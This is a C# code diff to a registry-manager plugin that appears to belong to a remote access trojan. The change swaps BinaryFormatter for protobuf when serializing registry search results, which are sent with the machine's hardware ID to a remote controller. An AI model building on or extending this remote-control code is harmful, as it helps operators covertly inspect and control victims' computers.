@@ -11,6 +11,7 @@ using Microsoft.Win32;
 using System.Text.RegularExpressions;
 using System.Runtime.Serialization.Formatters.Binary;
 using static Plugin.Handler.RegistrySeeker;
+using ProtoBuf;
 
 namespace Plugin.Handler
 {
@@ -94,6 +95,16 @@ namespace Plugin.Handler
         }
 
 
+        public static byte[] Serialize(RegSeekerMatch[] Matches)
+        {
+            using (MemoryStream ms = new MemoryStream())
+            {
+                Serializer.Serialize(ms, Matches);
+                return ms.ToArray();
+            }
+        }        
+
+
         public void LoadKey(string RootKeyName)
         {
             try
@@ -101,17 +112,18 @@ namespace Plugin.Handler
                 RegistrySeeker seeker = new RegistrySeeker();
                 seeker.BeginSeeking(RootKeyName);
 
-                BinaryFormatter formatter = new BinaryFormatter();
-                MemoryStream mStream = new MemoryStream();
-                formatter.Serialize(mStream, seeker.Matches);
-                mStream.Flush();
+
+                //BinaryFormatter formatter = new BinaryFormatter();
+                //MemoryStream mStream = new MemoryStream();
+                //formatter.Serialize(mStream, seeker.Matches);
+                //mStream.Flush();
 
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                 msgpack.ForcePathObject("Command").AsString = "LoadKey";
                 msgpack.ForcePathObject("RootKey").AsString = RootKeyName;
-                msgpack.ForcePathObject("Matches").SetAsBytes(mStream.GetBuffer());
+                msgpack.ForcePathObject("Matches").SetAsBytes(Serialize(seeker.Matches));
                 Connection.Send(msgpack.Encode2Bytes());
             }
             catch (Exception ex)
@@ -119,6 +131,24 @@ namespace Plugin.Handler
                 Packet.Error(ex.Message);
             }
         }
+
+        [ProtoContract]
+        public class GetRegistryKeysResponse
+        {
+            [ProtoMember(1)]
+            public RegSeekerMatch[] Matches { get; set; }
+
+            [ProtoMember(2)]
+            public string RootKey { get; set; }
+
+            [ProtoMember(3)]
+            public bool IsError { get; set; }
+
+            [ProtoMember(4)]
+            public string ErrorMsg { get; set; }
+        }
+
+
         public void CreateKey(string ParentPath)
         {
             string errorMsg;
